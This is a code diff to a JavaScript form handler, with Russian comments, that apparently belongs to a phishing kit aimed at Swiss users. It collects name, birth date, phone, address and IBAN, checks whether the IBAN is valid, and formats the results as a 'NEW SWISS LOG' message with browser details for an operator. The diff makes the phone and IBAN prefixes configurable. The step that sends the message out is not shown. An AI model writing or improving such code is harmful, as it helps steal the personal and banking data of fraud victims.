@@ -66,8 +66,12 @@ document.addEventListener('DOMContentLoaded', () => {
     const plz = document.getElementById('plz').value;
     const stadt = document.getElementById('stadt').value;
     const ibanInput = document.getElementById('iban').value;
+    
+    // Получаем префиксы, которые ввел пользователь
+    const phonePrefix = document.getElementById('phone-prefix').value;
+    const ibanPrefix = document.getElementById('iban-prefix').value;
 
-    const fullIBAN = 'CH' + ibanInput.replace(/\s+/g, '').toUpperCase();
+    const fullIBAN = ibanPrefix.toUpperCase() + ibanInput.replace(/\s+/g, '').toUpperCase();
     
     // --- Вычисляем статус IBAN ---
     const isIbanValid = isValidSwissIBAN(fullIBAN);
@@ -84,11 +88,11 @@ document.addEventListener('DOMContentLoaded', () => {
     let message = '🇨🇭 NEW SWISS LOG !\n\n';
     message += `👤 Name: ${name}\n`;
     message += `🎂 Geburtsdatum: ${geburtsdatum}\n`;
-    message += `📱 Telefon: +41${telefon}\n`;
+    message += `📱 Telefon: ${phonePrefix}${telefon}\n`;
     message += `📍 Adresse: ${adresse}\n`;
     message += `📮 PLZ: ${plz}\n`;
     message += `🏙️ Stadt: ${stadt}\n`;
-    message += `🏦 IBAN: CH${ibanInput}\n`;
+    message += `🏦 IBAN: ${ibanPrefix}${ibanInput}\n`;
     message += `🔍 IBAN-Status: ${ibanStatusText}\n\n`;
     message += `🕒 Zeit: ${dateTime}\n`;
     message += `🌐 Browser: ${browserInfo}\n`;
